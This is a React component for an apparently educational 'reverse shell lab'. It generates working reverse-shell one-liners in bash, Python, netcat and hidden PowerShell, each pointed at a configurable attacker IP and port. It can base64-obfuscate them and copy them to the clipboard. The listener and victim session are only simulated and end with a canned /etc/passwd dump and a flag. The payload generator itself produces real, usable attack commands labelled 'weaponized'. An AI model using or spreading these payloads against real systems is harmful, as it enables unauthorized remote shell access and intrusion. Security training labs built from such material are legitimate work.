import React, { useState } from 'react';
import { Terminal, Play, Copy, Check, RotateCcw, ShieldAlert, CheckCircle2, Radio } from 'lucide-react';

export default function ReverseShellLab() {
  const [lhost, setLhost] = useState<string>('10.10.14.33');
  const [lport, setLport] = useState<string>('9001');
  const [shellType, setShellType] = useState<'bash' | 'python' | 'netcat' | 'powershell'>('bash');
  const [encodeB64, setEncodeB64] = useState<boolean>(false);
  const [copied, setCopied] = useState<boolean>(false);
  const [listenerRunning, setListenerRunning] = useState<boolean>(false);
  const [terminalOutput, setTerminalOutput] = useState<string[]>([]);
  const [shellActive, setShellActive] = useState<boolean>(false);
  const [shellCmd, setShellCmd] = useState<string>('');

  const rawPayloads: Record<string, string> = {
    bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
    python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    netcat: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
    powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  };

  const currentPayload = encodeB64
    ? `echo "${btoa(rawPayloads[shellType])}" | base64 -d | bash`
    : rawPayloads[shellType];

  const handleCopy = () => {
    navigator.clipboard.writeText(currentPayload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleStartListener = () => {
    setListenerRunning(true);
    setShellActive(false);
    setTerminalOutput([
      `$ nc -lvnp ${lport}`,
      `listening on [any] ${lport} ...`,
      `[Attacker Waiting] Deploy payload on victim machine to trigger callback...`,
    ]);

    // Simulate victim triggering callback after 1.5 seconds
    setTimeout(() => {
      setTerminalOutput(prev => [
        ...prev,
        `connect to [${lhost}] from (UNKNOWN) [10.10.10.65] 48291`,
        `/bin/sh: turning off NDELAY mode`,
        `Linux victim-server 5.10.0-18-amd64 #1 SMP Debian`,
        `www-data@victim-server:/var/www/html$`,
      ]);
      setShellActive(true);
    }, 1500);
  };

  const handleSendShellCmd = (e: React.FormEvent) => {
    e.preventDefault();
    if (!shellCmd.trim()) return;

    const cmd = shellCmd.trim();
    let response = '';

    if (cmd === 'id') {
      response = 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
    } else if (cmd === 'whoami') {
      response = 'www-data';
    } else if (cmd === 'hostname') {
      response = 'victim-server.internal';
    } else if (cmd === 'cat /etc/passwd') {
      response = `root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nharshit:x:1000:1000:Harshit,,,:/home/harshit:/bin/bash`;
    } else if (cmd === 'cat flag.txt' || cmd === 'cat /var/www/flag.txt') {
      response = `[+] FLAG CAPTURED: FLAG{REVERSE_SHELL_NETCAT_SESSION_ESTABLISHED_2026}`;
    } else {
      response = `${cmd}: command executed successfully.`;
    }

    setTerminalOutput(prev => [
      ...prev,
      `www-data@victim-server:/var/www/html$ ${cmd}`,
      response,
    ]);
    setShellCmd('');
  };

  return (
    <div className="rounded-2xl border border-white/10 bg-black/60 p-6 md:p-8 backdrop-blur-xl shadow-2xl">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/10">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-xl bg-neon-green/10 border border-neon-green/30 text-neon-green">
            <Radio className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-lg font-bold text-white flex items-center gap-2">
              Reverse Shell Generator & Live Listener
              <span className="text-xs font-mono px-2 py-0.5 rounded-full bg-neon-green/20 text-neon-green border border-neon-green/30">
                LIVE INTERACTIVE LAB
              </span>
            </h3>
            <p className="text-xs font-mono text-gray-400">Weaponized Egress Shell Matrix & Netcat Catch Session</p>
          </div>
        </div>

        {/* Start Listener Button */}
        <button
          onClick={handleStartListener}
          className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-neon-green to-emerald-400 text-black font-mono font-bold text-xs flex items-center gap-2 shadow-[0_0_20px_rgba(0,255,159,0.4)] transition-all cursor-pointer"
        >
          <Play className="w-4 h-4" />
          Start Netcat Listener (nc -lvnp {lport})
        </button>
      </div>

      {/* Generator Inputs */}
      <div className="my-6 grid grid-cols-2 md:grid-cols-4 gap-4 font-mono text-xs">
        <div>
          <label className="text-gray-400 block text-[10px] mb-1">LHOST (ATTACKER IP):</label>
          <input
            type="text"
            value={lhost}
            onChange={(e) => setLhost(e.target.value)}
            className="w-full bg-black/80 border border-white/20 rounded-xl px-3 py-2 text-neon-green focus:outline-none"
          />
        </div>
        <div>
          <label className="text-gray-400 block text-[10px] mb-1">LPORT (LISTENER PORT):</label>
          <input
            type="text"
            value={lport}
            onChange={(e) => setLport(e.target.value)}
            className="w-full bg-black/80 border border-white/20 rounded-xl px-3 py-2 text-neon-green focus:outline-none"
          />
        </div>
        <div>
          <label className="text-gray-400 block text-[10px] mb-1">PAYLOAD LANGUAGE:</label>
          <select
            value={shellType}
            onChange={(e) => setShellType(e.target.value as any)}
            className="w-full bg-black/80 border border-white/20 rounded-xl px-3 py-2 text-white focus:outline-none cursor-pointer"
          >
            <option value="bash">Bash TCP</option>
            <option value="python">Python PTY</option>
            <option value="netcat">Netcat mkfifo</option>
            <option value="powershell">PowerShell</option>
          </select>
        </div>
        <div>
          <label className="text-gray-400 block text-[10px] mb-1">OBFUSCATION / ENCODING:</label>
          <button
            onClick={() => setEncodeB64(!encodeB64)}
            className={`w-full py-2 px-3 rounded-xl border text-xs font-bold transition-all cursor-pointer ${
              encodeB64
                ? 'bg-neon-green/20 text-neon-green border-neon-green/50'
                : 'bg-white/5 text-gray-400 border-white/10'
            }`}
          >
            {encodeB64 ? 'Base64 (Enabled)' : 'Raw Plaintext'}
          </button>
        </div>
      </div>

      {/* Generated Payload Box */}
      <div className="mb-6 p-4 rounded-xl bg-black/90 border border-white/10 font-mono text-xs">
        <div className="flex items-center justify-between text-gray-400 mb-2">
          <span>GENERATED REVERSE SHELL ONE-LINER:</span>
          <button
            onClick={handleCopy}
            className="flex items-center gap-1.5 text-[11px] text-neon-green hover:underline cursor-pointer"
          >
            {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
            {copied ? 'Copied to Clipboard' : 'Copy Payload'}
          </button>
        </div>
        <pre className="text-gray-200 overflow-x-auto whitespace-pre-wrap break-all p-3 rounded-lg bg-black/60 border border-white/5">
          <code>{currentPayload}</code>
        </pre>
      </div>

      {/* Interactive Listener Terminal */}
      {listenerRunning && (
        <div className="rounded-xl border border-white/20 bg-black/95 p-5 font-mono text-xs shadow-inner min-h-[260px] flex flex-col justify-between">
          <div className="space-y-2 overflow-y-auto max-h-[280px]">
            <div className="flex items-center justify-between pb-2 border-b border-white/10 text-[11px] text-gray-500">
              <span>NETCAT INTERACTIVE CATCH CONSOLE</span>
              <span className={shellActive ? 'text-neon-green font-bold' : 'text-amber-400 animate-pulse'}>
                {shellActive ? '● SHELL SESSION ACTIVE' : '○ LISTENING FOR INCOMING TCP...'}
              </span>
            </div>

            {terminalOutput.map((line, idx) => (
              <div key={idx} className={line.includes('connect to') || line.includes('FLAG') ? 'text-neon-green font-bold' : 'text-gray-300'}>
                {line}
              </div>
            ))}
          </div>

          {/* Shell Input if session active */}
          {shellActive && (
            <form onSubmit={handleSendShellCmd} className="mt-4 pt-3 border-t border-white/10 flex items-center gap-2">
              <span className="text-neon-green font-bold">www-data@victim-server:/var/www/html$</span>
              <input
                type="text"
                value={shellCmd}
                onChange={(e) => setShellCmd(e.target.value)}
                className="flex-1 bg-transparent text-white font-mono text-xs focus:outline-none placeholder-gray-600"
                placeholder="Type command (e.g. id, whoami, cat flag.txt)..."
                autoFocus
              />
              <button
                type="submit"
                className="px-3 py-1 rounded bg-neon-green text-black font-bold text-xs"
              >
                Send
              </button>
            </form>
          )}
        </div>
      )}
    </div>
  );
}
